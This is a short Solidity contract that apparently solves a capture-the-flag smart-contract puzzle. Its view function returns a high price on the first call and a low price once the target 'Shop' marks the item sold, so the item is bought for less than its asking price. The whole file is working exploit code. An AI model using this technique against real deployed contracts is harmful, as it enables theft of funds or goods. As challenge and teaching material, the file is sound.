// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    // we can define our own price() function
    // after first check of price(), isSold is set to true and later there is another price() call
    // we can check if isSold is true and pass lower price to Shop
    function price() public view returns (uint) {
        return shop.isSold() ? 1 : 101;
    }

    function attack() public {
        shop.buy();
    }
}

interface Shop {
    function buy() external;
    function isSold() external view returns(bool);
}
